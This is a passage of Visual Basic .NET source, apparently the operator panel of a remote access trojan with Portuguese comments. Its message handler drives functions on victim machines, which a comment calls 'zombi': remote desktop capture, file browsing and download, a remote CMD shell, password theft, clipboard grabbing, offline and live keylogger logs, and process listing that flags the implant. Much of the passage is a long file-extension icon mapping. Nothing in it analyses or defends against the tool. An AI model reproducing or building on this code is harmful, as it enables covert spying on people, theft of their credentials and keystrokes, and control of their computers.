                    Dim F As Descktop = My.Application.OpenForms("!" & sock)
                    If F IsNot Nothing Then
                        If a(1).Length = 1 Then
                            If F.Button1.Text = "Stop" Then 'stop capture
                                s.Send(sock, "@" & yy & F.C1.SelectedIndex & yy & F.C2.Text & yy & F.box1.Text)
                            End If
                            Exit Sub
                        End If
                        Dim BB As Byte() = fx(b, "@" & yy)(1)
                        F.PktToImage(BB) 'chame PktToImage em forme remote descktop
                    End If
                Case "@@" 'i recive image  
                    Dim BB As Byte() = fx(b, "@@" & yy)(1)
                    'file maneger
                Case "openfm"
                    If My.Application.OpenForms("openfm" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New Fm
                    fm.sock = sock
                    fm.Name = "openfm" & sock
                    fm.Text = "File Maneger " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    fm.Show()
                    'cmd
                Case "Cmdcomando"
                    If My.Application.OpenForms("Cmdcomando" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New Cmdcomando
                    fm.sock = sock
                    fm.Name = "Cmdcomando" & sock
                    fm.Text = "CMD " & l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    fm.Show()
                    Me.s.Send(sock, "Cmdcomando")
                    'Pasta compartihadas
                Case "pa"
                    If My.Application.OpenForms("pa" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New Pasta_compartihadas
                    f.sock = sock
                    f.Name = "pa" & sock
                    f.Text = "Pasta Compartihadas " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    f.Show()
                Case "pastacompartilhada"
                    Dim f As Pasta_compartihadas = My.Application.OpenForms("pa" & sock)
                    f.TextBox1.Clear()
                    f.TextBox1.Text = a(1)
                    'funções
                Case "fu"
                    If My.Application.OpenForms("fu" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New Fun
                    fm.sock = sock
                    fm.Name = "fu" & sock
                    fm.Text = "funções " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    fm.Show()
                    Me.s.Send(sock, "fu")
                    'get password
                Case "++"
                    Dim iii As UInteger = 1
                    If My.Application.OpenForms("++" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New password
                    fm.sock = sock
                    fm.Name = "++" & sock
                    If iii > 0 Then 'contador
                        iii += 1 '+ 1 + 1
                    End If
                    iii -= 2 '- 2
                    fm.Label1.Text = "Pass [" & iii & "]"
                    fm.Text = "Get Password " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    fm.Show()
                    Me.s.Send(sock, "ppww") 'chame pass
                    'get password
                Case "ppww"
                    Dim f As password = My.Application.OpenForms("++" & sock)
                    Dim aa As String() = Split(a(1), "|")
                    For i = 2 To aa.Length
                        Dim iti As New ListViewItem
                        iti.Text = aa(i)
                        iti.SubItems.Add(aa(i + 2))
                        iti.SubItems.Add(aa(i + 4))
                        iti.ImageIndex = 0 'add imagem
                        f.ListView1.Items.Add(iti)
                        i += 5
                    Next
                    'txt send msgbox
                Case "txttextsend"
                    If My.Application.OpenForms("txttextsend" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New TXT
                    f.sock = sock
                    f.Name = "txttextsend" & sock
                    f.Text = "TXT Send " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    f.Show()
                    'get clickbord
                Case "clipss"
                    If My.Application.OpenForms("clipss" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New clickbord
                    f.sock = sock
                    f.Name = "clipss" & sock
                    f.Text = "Get Clickbord " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    f.Show()
                Case "recvcli"
                    Dim f As clickbord = My.Application.OpenForms("clipss" & sock)
                    f.TextBox1.Text = a(1)
                    'keylogger offine
                Case "openlo"
                    If My.Application.OpenForms("openlo" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf Me.data)
                        Me.Invoke(j, New Object() {Me.sock, b})
                        Exit Sub
                    End If
                    Dim f As New Keylogger
                    f.sock = sock
                    f.Name = "openlo" & sock
                    f.Text = "Keylogger " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    f.Show()
                    'logs do keylogger offine
                Case "getlog"
                    Dim F As Keylogger = My.Application.OpenForms("openlo" & sock)
                    F.TextBox1.Text = a(1)
                    'keylogger online
                Case "online1"
                    If My.Application.OpenForms("online1" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New keylogger_online
                    f.sock = sock
                    f.Name = "online1" & sock
                    f.Text = "Keylogger " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    f.Show()
                    'logs do keylogger online
                Case "online"
                    Dim F As keylogger_online = My.Application.OpenForms("online1" & sock)
                    F.TextBox1.Text = a(1)
                    'txt sonido em zombi
                Case "txtsend"
                    If My.Application.OpenForms("txtsend" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New TXT_Send
                    f.sock = sock
                    f.Name = "txtsend" & sock
                    f.Text = "TXT Sonido " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    f.Show()
                    'processmanager
                Case "ProcessManager"
                    Dim ii As UInteger = 1
                    Dim f As Form3 = My.Application.OpenForms("\\" & sock)
                    Dim allProcess As String() = Split(a(1), "ProcessSplit")
                    For i = 0 To allProcess.Length - 2
                        Dim itm As New ListViewItem
                        itm.Text = allProcess(i)
                        itm.SubItems.Add(allProcess(i + 1))
                        itm.SubItems.Add(allProcess(i + 2))
                        itm.SubItems.Add(allProcess(i + 3))
                        itm.SubItems.Add(allProcess(i + 4))
                        itm.SubItems.Add(allProcess(i + 5))
                        itm.SubItems.Add(allProcess(i + 6))
                        itm.ImageIndex = 0 'imagem
                        If ii > 0 Then 'contador
                            ii += 1 '+ 1 + 1
                        End If
                        f.Label1.Text = "Total Processos " & ii
                        f.ListView1.Items.Add(itm) 'add
                        i += 6
                    Next
                    f.ListView1.FindItemWithText(a(2)).ForeColor = Color.Red 'marque server com color red
                    'processmanager
                Case "\\"
                    If My.Application.OpenForms("\\" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New Form3
                    f.sock = sock
                    f.Name = "\\" & sock
                    f.Text = "Gerenciador De Tarefas " & Me.l1.Items.Item(0).SubItems.Item(2).Text & "/" & Me.l1.Items.Item(0).SubItems.Item(3).Text & " " & s.IP(sock) 'nome + user/computer + ip
                    f.Show()
                    ' downloaded file maneger
                Case "downloadedfile" 'past onde ficara os arquivos baixados/ name = Download
                    If IO.File.Exists(Application.StartupPath & "\Download\" & a(2)) Then
                        Try
                            IO.File.SetAttributes(Application.StartupPath & "\Download\" & a(2), FileAttributes.Normal) 'normal
                        Catch ex As Exception
                        End Try
                        Try
                            IO.File.Delete(Application.StartupPath & "\Download\" & a(2)) 'delete
                        Catch ex As Exception
                        End Try
                        Try

                            My.Computer.FileSystem.WriteAllBytes(Application.StartupPath & "\Download\" & a(2), Convert.FromBase64String(a(1)), False) 'baixar
                        Catch ex As Exception
                        End Try
                    Else
                        Try
                            My.Computer.FileSystem.WriteAllBytes(Application.StartupPath & "\Download\" & a(2), Convert.FromBase64String(a(1)), False) 'baixar
                            IO.File.SetAttributes(Application.StartupPath & "\Download\" & a(2), FileAttributes.Normal) 'normal
                        Catch ex As Exception
                        End Try
                    End If
                    'file manager
                Case "FileManager"
                    Dim fff As Fm = My.Application.OpenForms("openfm" & sock)
                    If a(1) = "Erro !!" Then
                        fff.Button1.PerformClick()
                    Else
                        fff.ListView1.Items.Clear()
                        Dim allFiles As String() = Split(a(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2
                            Dim itm As New ListViewItem
                            itm.Text = allFiles(i)
                            itm.SubItems.Add(allFiles(i + 1))
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB" 'Giga Byts
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB" 'Mega Byts
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB" 'kB 
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then 'drivers todos exe (cd dvd pendrivers)
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[Folder]") Then 'modificar e ler os driver 
                                itm.ImageIndex = 2
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.EndsWith(".exe") Or itm.Text.EndsWith(".EXE") Or itm.Text.EndsWith(".scr") Or itm.Text.EndsWith(".SCR") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".JPG") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".JPEG") Or itm.Text.EndsWith(".svg") Or itm.Text.EndsWith(".SVG") Or itm.Text.EndsWith(".svgz") Or itm.Text.EndsWith(".SVGZ") Or itm.Text.EndsWith(".drw") Or itm.Text.EndsWith(".DRW") Or itm.Text.EndsWith(".psp") Or itm.Text.EndsWith(".PSP") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".GIF") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".PNG") Or itm.Text.EndsWith(".bmp") Or itm.Text.EndsWith(".BMP") Or itm.Text.EndsWith(".dib") Or itm.Text.EndsWith(".DIB") Or itm.Text.EndsWith(".jpe") Or itm.Text.EndsWith(".JPE") Or itm.Text.EndsWith(".jfif") Or itm.Text.EndsWith(".JFIF") Or itm.Text.EndsWith(".tif") Or itm.Text.EndsWith(".TIF") Or itm.Text.EndsWith(".tiff") Or itm.Text.EndsWith(".TIFF") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".txt") Or itm.Text.EndsWith(".TXT") Or itm.Text.EndsWith(".log") Or itm.Text.EndsWith(".LOG") Or itm.Text.EndsWith(".readme") Or itm.Text.EndsWith(".README") Or itm.Text.EndsWith(".me") Or itm.Text.EndsWith(".ME") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Or itm.Text.EndsWith(".DLL") Or itm.Text.EndsWith(".chk") Or itm.Text.EndsWith(".sys") Or itm.Text.EndsWith(".cpl") Or itm.Text.EndsWith(".db") Or itm.Text.EndsWith(".DB") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".ZIP") Or itm.Text.EndsWith(".rar") Or itm.Text.EndsWith(".RAR") Or itm.Text.EndsWith(".7z") Or itm.Text.EndsWith(".7Z") Or itm.Text.EndsWith(".tar") Or itm.Text.EndsWith(".TAR") Or itm.Text.EndsWith(".tgz") Or itm.Text.EndsWith(".TGZ") Or itm.Text.EndsWith(".gz") Or itm.Text.EndsWith(".GZ") Or itm.Text.EndsWith(".bz2") Or itm.Text.EndsWith(".BZ2") Or itm.Text.EndsWith(".tbz2") Or itm.Text.EndsWith(".TBZ2") Or itm.Text.EndsWith(".gzip") Or itm.Text.EndsWith(".GZIP") Or itm.Text.EndsWith(".z") Or itm.Text.EndsWith(".Z") Or itm.Text.EndsWith(".sit") Or itm.Text.EndsWith(".SIT") Or itm.Text.EndsWith(".cab") Or itm.Text.EndsWith(".CAB") Or itm.Text.EndsWith(".lzh") Or itm.Text.EndsWith(".LZH") Or itm.Text.EndsWith(".pkg") Or itm.Text.EndsWith(".PKG") Then
                                itm.ImageIndex = 7
                            ElseIf itm.Text.EndsWith(".bat") Or itm.Text.EndsWith(".BAT") Or itm.Text.EndsWith(".cmd") Or itm.Text.EndsWith(".CMD") Then
                                itm.ImageIndex = 9
                            ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".AVI") Or itm.Text.EndsWith(".divx") Or itm.Text.EndsWith(".DIVX") Or itm.Text.EndsWith(".mkv") Or itm.Text.EndsWith(".MKV") Or itm.Text.EndsWith(".webm") Or itm.Text.EndsWith(".WEBM") Or itm.Text.EndsWith(".mp4") Or itm.Text.EndsWith(".MP4") Or itm.Text.EndsWith(".m4v") Or itm.Text.EndsWith(".M4V") Or itm.Text.EndsWith(".mp4v") Or itm.Text.EndsWith(".MP4V") Or itm.Text.EndsWith(".mpv4") Or itm.Text.EndsWith(".MPV4") Or itm.Text.EndsWith(".ogm") Or itm.Text.EndsWith(".OGM") Or itm.Text.EndsWith(".ogv") Or itm.Text.EndsWith(".OGV") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".FLV") Or itm.Text.EndsWith(".mpeg") Or itm.Text.EndsWith(".MPEG") Or itm.Text.EndsWith(".mpg") Or itm.Text.EndsWith(".MPG") Or itm.Text.EndsWith(".mp2v") Or itm.Text.EndsWith(".MP2V") Or itm.Text.EndsWith(".mpv2") Or itm.Text.EndsWith(".MPV2") Or itm.Text.EndsWith(".m1v") Or itm.Text.EndsWith(".M1V") Or itm.Text.EndsWith(".m2v") Or itm.Text.EndsWith(".M2V") Or itm.Text.EndsWith(".m2p") Or itm.Text.EndsWith(".M2P") Or itm.Text.EndsWith(".mpe") Or itm.Text.EndsWith(".MPE") Or itm.Text.EndsWith(".ts") Or itm.Text.EndsWith(".TS") Or itm.Text.EndsWith(".m2ts") Or itm.Text.EndsWith(".M2TS") Or itm.Text.EndsWith(".mts") Or itm.Text.EndsWith(".MTS") Or itm.Text.EndsWith(".m2t") Or itm.Text.EndsWith(".M2T") Or itm.Text.EndsWith(".tps") Or itm.Text.EndsWith(".TPS") Or itm.Text.EndsWith(".hdmov") Or itm.Text.EndsWith(".HDMOV") Or itm.Text.EndsWith(".mov") Or itm.Text.EndsWith(".MOV") Or itm.Text.EndsWith(".3gp") Or itm.Text.EndsWith(".3GP") Or itm.Text.EndsWith(".3gpp") Or itm.Text.EndsWith(".3GPP") Or itm.Text.EndsWith(".wmv") Or itm.Text.EndsWith(".WMV") Or itm.Text.EndsWith(".asf") Or itm.Text.EndsWith(".ASF") Or itm.Text.EndsWith(".ifo") Or itm.Text.EndsWith(".IFO") Or itm.Text.EndsWith(".vob") Or itm.Text.EndsWith(".VOB") Or itm.Text.EndsWith(".mpls") Or itm.Text.EndsWith(".MPLS") Or itm.Text.EndsWith(".rm") Or itm.Text.EndsWith(".RM") Or itm.Text.EndsWith(".rmvb") Or itm.Text.EndsWith(".RMVB") Then
                                itm.ImageIndex = 11
                            ElseIf itm.Text.EndsWith(".mp3") Or itm.Text.EndsWith(".MP3") Or itm.Text.EndsWith(".it") Or itm.Text.EndsWith(".IT") Or itm.Text.EndsWith(".asx") Or itm.Text.EndsWith(".ASX") Or itm.Text.EndsWith(".au") Or itm.Text.EndsWith(".AU") Or itm.Text.EndsWith(".mid") Or itm.Text.EndsWith(".MID") Or itm.Text.EndsWith(".midi") Or itm.Text.EndsWith(".MIDI") Or itm.Text.EndsWith(".snd") Or itm.Text.EndsWith(".SND") Or itm.Text.EndsWith(".wma") Or itm.Text.EndsWith(".WMA") Or itm.Text.EndsWith(".aiff") Or itm.Text.EndsWith(".AIFF") Or itm.Text.EndsWith(".ogg") Or itm.Text.EndsWith(".OGG") Or itm.Text.EndsWith(".oga") Or itm.Text.EndsWith(".OGA") Or itm.Text.EndsWith(".mka") Or itm.Text.EndsWith(".MKA") Or itm.Text.EndsWith(".m4a") Or itm.Text.EndsWith(".M4A") Or itm.Text.EndsWith(".aac") Or itm.Text.EndsWith(".AAC") Or itm.Text.EndsWith(".flac") Or itm.Text.EndsWith(".FLAC") Or itm.Text.EndsWith(".wv") Or itm.Text.EndsWith(".WV") Or itm.Text.EndsWith(".mpc") Or itm.Text.EndsWith(".MPC") Or itm.Text.EndsWith(".ape") Or itm.Text.EndsWith(".APE") Or itm.Text.EndsWith(".apl") Or itm.Text.EndsWith(".APL") Or itm.Text.EndsWith(".alac") Or itm.Text.EndsWith(".ALAC") Or itm.Text.EndsWith(".tta") Or itm.Text.EndsWith(".TTA") Or itm.Text.EndsWith(".ac3") Or itm.Text.EndsWith(".AC3") Or itm.Text.EndsWith(".dts") Or itm.Text.EndsWith(".DTS") Or itm.Text.EndsWith(".amr") Or itm.Text.EndsWith(".AMR") Or itm.Text.EndsWith(".ra") Or itm.Text.EndsWith(".RA") Or itm.Text.EndsWith(".wav") Or itm.Text.EndsWith(".WAV") Or itm.Text.EndsWith(".mpcpl") Or itm.Text.EndsWith(".MPCPL") Or itm.Text.EndsWith(".m3u") Or itm.Text.EndsWith(".M3U") Or itm.Text.EndsWith(".pls") Or itm.Text.EndsWith(".PLS") Then
                                itm.ImageIndex = 10
                            ElseIf itm.Text.EndsWith(".lnk") Or itm.Text.EndsWith(".LNK") Then
                                itm.ImageIndex = 12
                            ElseIf itm.Text.EndsWith(".bin") Or itm.Text.EndsWith(".BIN") Or itm.Text.EndsWith(".bak") Or itm.Text.EndsWith(".BAK") Or itm.Text.EndsWith(".dat") Or itm.Text.EndsWith(".DAT") Then
                                itm.ImageIndex = 13
                            ElseIf itm.Text.EndsWith(".xlsx") Or itm.Text.EndsWith(".XLSX") Or itm.Text.EndsWith(".xlsm") Or itm.Text.EndsWith(".XLSM") Or itm.Text.EndsWith(".xlsb") Or itm.Text.EndsWith(".XLSB") Or itm.Text.EndsWith(".xltm") Or itm.Text.EndsWith(".XLTM") Or itm.Text.EndsWith(".xlam") Or itm.Text.EndsWith(".XLAM") Or itm.Text.EndsWith(".xltx") Or itm.Text.EndsWith(".XLTX") Or itm.Text.EndsWith(".xll") Or itm.Text.EndsWith(".XLL") Then
                                itm.ImageIndex = 14
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".DOC") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".RTF") Or itm.Text.EndsWith(".docx") Or itm.Text.EndsWith(".DOCX") Or itm.Text.EndsWith(".docm") Or itm.Text.EndsWith(".DOCM") Or itm.Text.EndsWith(".psw") Or itm.Text.EndsWith(".PSW") Or itm.Text.EndsWith(".dot") Or itm.Text.EndsWith(".DOT") Or itm.Text.EndsWith(".dotx") Or itm.Text.EndsWith(".DOTX") Or itm.Text.EndsWith(".dotm") Or itm.Text.EndsWith(".DOTM") Then
                                itm.ImageIndex = 15
                            ElseIf itm.Text.EndsWith(".ini") Or itm.Text.EndsWith(".INI") Or itm.Text.EndsWith(".sys") Or itm.Text.EndsWith(".SYS") Or itm.Text.EndsWith(".css") Or itm.Text.EndsWith(".CSS") Or itm.Text.EndsWith(".inf") Or itm.Text.EndsWith(".INF") Then
                                itm.ImageIndex = 16
                            ElseIf itm.Text.EndsWith(".pdf") Or itm.Text.EndsWith(".PDF") Then
                                itm.ImageIndex = 17
                            ElseIf itm.Text.EndsWith(".pptx") Or itm.Text.EndsWith(".PPTX") Or itm.Text.EndsWith(".ppt") Or itm.Text.EndsWith(".PPT") Or itm.Text.EndsWith(".pps") Or itm.Text.EndsWith(".PPS") Or itm.Text.EndsWith(".pptm") Or itm.Text.EndsWith(".PPTM") Or itm.Text.EndsWith(".potx") Or itm.Text.EndsWith(".POTX") Or itm.Text.EndsWith(".potm") Or itm.Text.EndsWith(".POTM") Or itm.Text.EndsWith(".ppam") Or itm.Text.EndsWith(".PPAM") Or itm.Text.EndsWith(".ppsx") Or itm.Text.EndsWith(".PPSX") Or itm.Text.EndsWith(".ppsm") Or itm.Text.EndsWith(".PPSM") Then
                                itm.ImageIndex = 18
                            ElseIf itm.Text.EndsWith(".swf") Or itm.Text.EndsWith(".SWF") Or itm.Text.EndsWith(".htm") Or itm.Text.EndsWith(".HTM") Or itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".HTML") Then
                                itm.ImageIndex = 20
                            ElseIf itm.Text.EndsWith(".reg") Or itm.Text.EndsWith(".REG") Then
                                itm.ImageIndex = 19
                            ElseIf itm.Text.EndsWith(".AACCDB") Or itm.Text.EndsWith(".aaccdb") Or itm.Text.EndsWith(".ACCDE") Or itm.Text.EndsWith(".accde") Or itm.Text.EndsWith(".ACCDT") Or itm.Text.EndsWith(".accdt") Or itm.Text.EndsWith(".ACCDR") Or itm.Text.EndsWith(".accdr") Then
                                itm.ImageIndex = 21
                            ElseIf itm.Text.EndsWith(".xml") Or itm.Text.EndsWith(".XML") Then
                                itm.ImageIndex = 22
                            ElseIf itm.Text.EndsWith(".odt") Or itm.Text.EndsWith(".ODT") Or itm.Text.EndsWith(".ott") Or itm.Text.EndsWith(".OTT") Or itm.Text.EndsWith(".sxw") Or itm.Text.EndsWith(".SXW") Or itm.Text.EndsWith(".stw") Or itm.Text.EndsWith(".STW") Or itm.Text.EndsWith(".sor") Or itm.Text.EndsWith(".SOR") Or itm.Text.EndsWith(".sxc") Or itm.Text.EndsWith(".SXC") Or itm.Text.EndsWith(".stc") Or itm.Text.EndsWith(".STC") Or itm.Text.EndsWith(".sxi") Or itm.Text.EndsWith(".SXI") Or itm.Text.EndsWith(".sti") Or itm.Text.EndsWith(".STI") Or itm.Text.EndsWith(".sxd") Or itm.Text.EndsWith(".SXD") Or itm.Text.EndsWith(".std") Or itm.Text.EndsWith(".STD") Or itm.Text.EndsWith(".sxg") Or itm.Text.EndsWith(".SXG") Then
                                itm.ImageIndex = 23
                            ElseIf itm.Text.EndsWith(".temp") Or itm.Text.EndsWith(".TEMP") Or itm.Text.EndsWith(".tmp") Or itm.Text.EndsWith(".TMP") Then
                                itm.ImageIndex = 24
                            ElseIf itm.Text.EndsWith(".iso") Or itm.Text.EndsWith(".ISO") Then
                                itm.ImageIndex = 25
                            ElseIf itm.Text.EndsWith(".save") Or itm.Text.EndsWith(".SAVE") Or itm.Text.EndsWith(".sav") Or itm.Text.EndsWith(".SAV") Then
                                itm.ImageIndex = 26
                            ElseIf itm.Text.EndsWith(".crt") Or itm.Text.EndsWith(".CRT") Then
                                itm.ImageIndex = 27
                            ElseIf itm.Text.EndsWith(".js") Or itm.Text.EndsWith(".JS") Then
                                itm.ImageIndex = 28
                            ElseIf itm.Text.EndsWith(".cat") Or itm.Text.EndsWith(".CAT") Then
                                itm.ImageIndex = 29
                            ElseIf itm.Text.EndsWith(".chm") Or itm.Text.EndsWith(".CHM") Then
                                itm.ImageIndex = 30
                            ElseIf itm.Text.EndsWith(".vmdk") Or itm.Text.EndsWith(".VMDK") Then
                                itm.ImageIndex = 31
                            ElseIf itm.Text.EndsWith(".vmx") Or itm.Text.EndsWith(".VMX") Then
                                itm.ImageIndex = 32
                            ElseIf itm.Text.EndsWith(".vbs") Or itm.Text.EndsWith(".VBS") Or itm.Text.EndsWith(".vbe") Or itm.Text.EndsWith(".VBE") Or itm.Text.EndsWith(".wsf") Or itm.Text.EndsWith(".WSF") Or itm.Text.EndsWith(".wsc") Or itm.Text.EndsWith(".WSC") Then
                                itm.ImageIndex = 33
                            ElseIf itm.Text.EndsWith(".nfo") Or itm.Text.EndsWith(".NFO") Then
                                itm.ImageIndex = 34
                            ElseIf itm.Text.EndsWith(".sln") Or itm.Text.EndsWith(".SLN") Then
                                itm.ImageIndex = 35
                            ElseIf itm.Text.EndsWith(".vb") Or itm.Text.EndsWith(".VB") Then
                                itm.ImageIndex = 36
                            ElseIf itm.Text.EndsWith(".resx") Or itm.Text.EndsWith(".RESX") Then
                                itm.ImageIndex = 37
                            ElseIf itm.Text.EndsWith(".config") Or itm.Text.EndsWith(".CONFIG") Then
                                itm.ImageIndex = 38
                            ElseIf itm.Text.EndsWith(".vbproj") Or itm.Text.EndsWith(".VBPROJ") Then
                                itm.ImageIndex = 39
                            ElseIf itm.Text.EndsWith(".settings") Or itm.Text.EndsWith(".SETTINGS") Then
                                itm.ImageIndex = 40
                            ElseIf itm.Text.EndsWith(".user") Or itm.Text.EndsWith(".USER") Or itm.Text.EndsWith(".suo") Or itm.Text.EndsWith(".SUO") Then
                                itm.ImageIndex = 41
                            ElseIf itm.Text.EndsWith(".pdb") Or itm.Text.EndsWith(".PDB") Then
                                itm.ImageIndex = 42
                            ElseIf itm.Text.EndsWith(".xslt") Or itm.Text.EndsWith(".XSLT") Then
                                itm.ImageIndex = 43
                            ElseIf itm.Text.EndsWith(".obj") Or itm.Text.EndsWith(".OBJ") Then
                                itm.ImageIndex = 44
                            ElseIf itm.Text.EndsWith(".rc") Or itm.Text.EndsWith(".RC") Then
                                itm.ImageIndex = 45
                            ElseIf itm.Text.EndsWith(".inc") Or itm.Text.EndsWith(".INC") Or itm.Text.EndsWith(".lst") Or itm.Text.EndsWith(".LST") Then
                                itm.ImageIndex = 46
                            ElseIf itm.Text.EndsWith(".res") Or itm.Text.EndsWith(".RES") Then
                                itm.ImageIndex = 47
                            ElseIf itm.Text.EndsWith(".mdmp") Or itm.Text.EndsWith(".MDMP") Then
                                itm.ImageIndex = 48
                            ElseIf itm.Text.EndsWith(".ResmonCfg") Or itm.Text.EndsWith(".RESMONCFG") Then
                                itm.ImageIndex = 49
                            ElseIf itm.Text.EndsWith(".conf") Or itm.Text.EndsWith(".CONF") Or itm.Text.EndsWith(".leases") Or itm.Text.EndsWith(".LEASES") Then
                                itm.ImageIndex = 50
                            ElseIf itm.Text.EndsWith(".cur") Or itm.Text.EndsWith(".CUR") Then
                                itm.ImageIndex = 51
                            ElseIf itm.Text.EndsWith(".ani") Or itm.Text.EndsWith(".ANI") Then
                                itm.ImageIndex = 52
                            ElseIf itm.Text.EndsWith(".url") Or itm.Text.EndsWith(".URL") Then
                                itm.ImageIndex = 53
                            ElseIf itm.Text.EndsWith(".ttf") Or itm.Text.EndsWith(".TTF") Or itm.Text.EndsWith(".otf") Or itm.Text.EndsWith(".OTF") Then
                                itm.ImageIndex = 54
                            ElseIf itm.Text.EndsWith(".blend") Or itm.Text.EndsWith(".BLEND") Then
                                itm.ImageIndex = 55
                            ElseIf itm.Text.EndsWith(".icc") Or itm.Text.EndsWith(".ICC") Then
                                itm.ImageIndex = 56
                            ElseIf itm.Text.EndsWith(".a3x") Or itm.Text.EndsWith(".A3X") Or itm.Text.EndsWith(".au3") Or itm.Text.EndsWith(".AU3") Then
                                itm.ImageIndex = 57
                            ElseIf itm.Text.EndsWith(".jar") Or itm.Text.EndsWith(".JAR") Then
                                itm.ImageIndex = 59
                            ElseIf itm.Text.EndsWith(".torrent") Or itm.Text.EndsWith(".torrent") Then
                                itm.ImageIndex = 60
                            ElseIf itm.Text.EndsWith(".hlp") Or itm.Text.EndsWith(".hlp") Then
                                itm.ImageIndex = 62
                            ElseIf itm.Text.EndsWith(".pkgdef") Or itm.Text.EndsWith(".pkgdef") Or itm.Text.EndsWith(".pkgundef") Or itm.Text.EndsWith(".vb") Then
                                itm.ImageIndex = 61
